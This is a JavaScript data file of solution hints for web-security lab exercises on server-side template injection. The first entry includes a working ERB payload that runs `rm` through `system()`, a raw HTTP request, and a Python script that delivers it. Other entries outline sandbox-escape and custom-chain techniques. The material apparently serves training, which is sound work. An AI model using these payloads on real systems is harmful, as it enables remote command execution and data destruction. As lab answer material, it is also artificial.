export default {
  'ssti-lab-server-side-template-injection-basic': {
    note: 'The message parameter is concatenated into an ERB template; `<%= 7*7 %>` returns 49, then `<%= system(...) %>` executes.',
    work: {
      hints: [
        'The page echoes your message. Send `<%= 7*7 %>` and see whether it renders 49 or the literal text.',
        'The engine is ERB (Ruby). `<% %>` executes Ruby; `<%= %>` outputs the result.',
        'Use `<%= system("rm /home/carlos/morale.txt") %>` to run a shell command.'
      ],
      approach:
        'User input is concatenated into template source. The engine compiles the result, so ERB tags in the input become Ruby code. The response confirms evaluation with arithmetic before the destructive command.',
      request: `POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Cookie: session=YOUR-SESSION

message=%3C%25%3D+system%28%22rm+%2Fhome%2Fcarlos%2Fmorale.txt%22%29+%25%3E`,
      tokens: [
        ['<%', 'ERB execution tag: the contents are Ruby code, not output.'],
        ['=', 'Output tag variant: the return value is written into the rendered page.'],
        ['system(', 'Ruby method that runs a shell command and returns true/false.'],
        ['"rm /home/carlos/morale.txt"', 'The command string; quotes delimit it inside Ruby.'],
        ['%>', 'Closes the ERB tag and returns to template text.']
      ],
      script: `import sys, requests

host = sys.argv[1]
s = requests.Session()
payload = '<%= system("rm /home/carlos/morale.txt") %>'
r = s.post(f"https://{host}/", data={"message": payload}, timeout=20)
print(r.status_code, "rendered" if "49" not in r.text else r.text[:200])`
    }
  },
  'ssti-lab-server-side-template-injection-basic-code-context': {
    note: 'The input lands inside a code expression, not text; close the string and the expression, then inject a new tag.'
  },
  'ssti-lab-server-side-template-injection-using-documentation': {
    note: 'Identify the engine from its syntax, then follow its documented object-access path to execute a command.'
  },
  'ssti-lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit': {
    note: 'Fingerprint an unfamiliar engine, find a published exploit for its version, and adapt the payload.'
  },
  'ssti-lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects': {
    note: 'The template receives a user object; walk its properties and methods to reach a file read or secret.'
  },
  'ssti-lab-server-side-template-injection-in-a-sandboxed-environment': {
    note: 'Dangerous methods are blocked; escape the sandbox through reflection (`__class__`, `__subclasses__`, engine internals).'
  },
  'ssti-lab-server-side-template-injection-with-a-custom-exploit': {
    note: 'No public payload fits; build a chain from the application\'s own classes and the engine\'s documented primitives.'
  }
}
